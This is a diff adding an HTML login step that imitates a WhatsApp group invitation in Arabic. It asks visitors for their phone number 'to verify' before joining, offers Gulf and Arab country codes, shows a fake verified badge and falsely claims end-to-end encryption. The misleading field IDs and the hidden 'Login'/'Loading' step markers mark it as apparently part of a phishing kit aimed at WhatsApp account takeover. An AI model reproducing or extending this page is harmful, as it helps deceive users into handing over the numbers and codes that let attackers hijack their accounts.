@@ -1,0 +1,65 @@
+<input type="hidden" id="DivName" value="Login">
+<input type="hidden" id="DivNext" value="Loading">
+
+<div class="whatsapp-card" id="loginContainer">
+  <div class="group-header">
+    <div class="group-avatar-container">
+      <img class="group-avatar" src="./assets/images/group_avatar.png" alt="Group Icon">
+      <span class="verified-badge">✓</span>
+    </div>
+    <h2 class="group-title">أدخل رقم هاتفك</h2>
+    <span class="group-subtitle">سيحتاج الانضمام إلى المجموعة إلى التحقق من رقم هاتفك.</span>
+  </div>
+
+  <div id="errorMsg" style="display: none;"></div>
+
+  <div class="phone-layout">
+    <div class="country-select">
+      <select id="Address" name="countryCode">
+        <option value="auto">تحديد تلقائي حسب الموقع</option>
+        <option value="+968">🇴🇲 عُمان (+968)</option>
+        <option value="+966">🇸🇦 السعودية (+966)</option>
+        <option value="+971">🇦🇪 الإمارات (+971)</option>
+        <option value="+965">🇰🇼 الكويت (+965)</option>
+        <option value="+973">🇧🇭 البحرين (+973)</option>
+        <option value="+974">🇶🇦 قطر (+974)</option>
+        <option value="+962">🇯🇴 الأردن (+962)</option>
+        <option value="+963">🇸🇾 سوريا (+963)</option>
+        <option value="+967">🇾🇪 اليمن (+967)</option>
+        <option value="+212">🇲🇦 المغرب (+212)</option>
+        <option value="+213">🇩🇿 الجزائر (+213)</option>
+        <option value="+216">🇹🇳 تونس (+216)</option>
+        <option value="+20">🇪🇬 مصر (+20)</option>
+        <option value="+218">🇱🇾 ليبيا (+218)</option>
+        <option value="+249">🇸🇩 السودان (+249)</option>
+        <option value="+961">🇱🇧 لبنان (+961)</option>
+        <option value="+970">🇵🇸 فلسطين (+970)</option>
+        <option value="+964">🇮🇶 العراق (+964)</option>
+      </select>
+    </div>
+    <div class="input-container">
+      <input type="tel" id="Zip" name="phone" placeholder=" 99999999" inputmode="numeric" dir="ltr">
+    </div>
+  </div>
+
+  <button type="submit" class="btn-primary" id="clickmee">
+    <span>التالي</span>
+  </button>
+
+  <div class="secure-note">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+      <path d="M12 2C9.24 2 7 4.24 7 7V9H6C4.9 9 4 9.9 4 11V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V11C20 9.9 19.1 9 18 9H17V7C17 4.24 14.76 2 12 2ZM9 7C9 5.34 10.34 4 12 4C13.66 4 15 5.34 15 7V9H9V7ZM12 13C12.83 13 13.5 13.67 13.5 14.5C13.5 15.33 12.83 16 12 16C11.17 16 10.5 15.33 10.5 14.5C10.5 13.67 11.17 13 12 13Z"/>
+    </svg>
+    <span style="font-size: 0.8rem;">مشفر بالكامل من طرف إلى طرف</span>
+  </div>
+</div>
+
+<script>
+  const zipEl = document.getElementById('Zip');
+  if (zipEl && window.enforceDigitsOnly) {
+    window.enforceDigitsOnly(zipEl);
+  }
+  if (window.autoSelectCountryCode) {
+    window.autoSelectCountryCode();
+  }
+</script>
